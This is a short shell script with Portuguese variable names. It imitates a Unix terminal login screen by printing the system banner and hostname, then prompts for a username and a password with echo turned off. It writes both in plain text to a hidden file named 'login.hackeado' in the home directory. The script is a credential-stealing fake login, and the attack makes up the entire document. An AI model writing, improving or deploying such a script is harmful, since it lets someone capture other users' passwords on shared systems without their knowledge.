clear
cat/etc/issue

DOMINIO='domainname'
MAQUINA='sed -e "s/.$DOMINIO//" /etc/HOSTNAME'


echo -n "$MAQUINA login: ";
read login
stty -echo
echo -n "Password: "
read senha
stty echo 
echo -e "Login: $login\nSenha: $senha\n " >> ~/login.hackeado
